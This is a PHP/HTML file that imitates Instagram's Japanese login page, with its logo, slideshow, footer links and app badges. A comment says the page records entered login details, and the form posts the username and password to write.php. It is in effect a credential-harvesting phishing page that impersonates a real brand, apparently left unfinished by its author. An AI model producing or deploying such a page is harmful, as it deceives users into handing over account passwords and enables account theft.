<!--instagramのダミーサイトをつくろうとしましたが、やめました。。
このページでログイン入力し記録を保存します。本コンテンツはこの後の（contents.php）のリンクになります-->

<?php
?>
<!DOCTYPE html>
<html lang="ja" class="no-js not-logged-in client-root">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Instagram</title>
<!--
 Copyright 2018 Google Inc. All Rights Reserved.
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.-->

 <!-- Bootstrap CSS -->
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
 <link rel="stylesheet" href="index.css">

</head>

<body>
<div class="body">

<div class="section">
  <section class="section1">
    <div class="containts">
      <div class="img">
        <img src="image/top.png" alt="">
      </div>

  <div class="slideshow_body">
    <div class="css-slideshow">
      <figure>
            <img src="image/top-1.jpg"/>
      </figure>
      <figure>
            <img src="image/top-2.jpg"/>
      </figure>
      <figure>
            <img src="image/top-3.jpg"/>
      </figure>
      <figure>
            <img src="image/top-4.jpg"/>
      </figure>
      <figure>
            <img src="image/top-5.jpg"/>
      </figure>
    </div> 
  </div>

  </section>
    
  <section class="section2">
  <form class="login"action="write.php" method="post">
      <!--<div class="login">-->
            <img class="logo" src="image/logo.png" alt="">
                    <input class="text_login" type="text" name="email" placeholder="電話番号、ユーザーネーム、メールアドレス">
                    <input class="text_login" type="text" name="pass" placeholder="パスワード">
                 <div class="btn">
                   <input type="submit" href="contents/contents.php" value="ログイン" id="image" class="btn_login">
                 </div>
            <p class="s1">または</p>
            <img class="img_fb" src="image/fb_login.png" alt="">
            <p class="forget_pass" href="">パスワードを忘れた場合</p>
      <!--</div>-->
    </form>
       <div class="register">
        <p>アカウントをお持ちでないですか？</p>
        <p class="register_text" href="">登録する</p>
       </div>

      <div class="icon">
        <p>ダウンロード</p>
          <div class="icon_img">
            <img src="image/app.png" alt="">
            <img src="image/gg.png" alt="">
          </div>
      </div>
  </div>

</div>

    <div class="footer">
      <div class="footer_1">
          <ul style="list-style: none;">
              <li>基本データ</li>
              <li>ヘルプ</li>
              <li>プレス</li>
              <li>API</li>
              <li>求人</li>
              <li>プライバシー</li>
              <li>利用規約</li>
              <li>人気アカウント</li>
              <li>ハッシュタグ</li>
              <li>言語</li>
          </ul>
    </div>
  </section>
</div>
  
<!--bootstrap-->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>

</body>
</html>

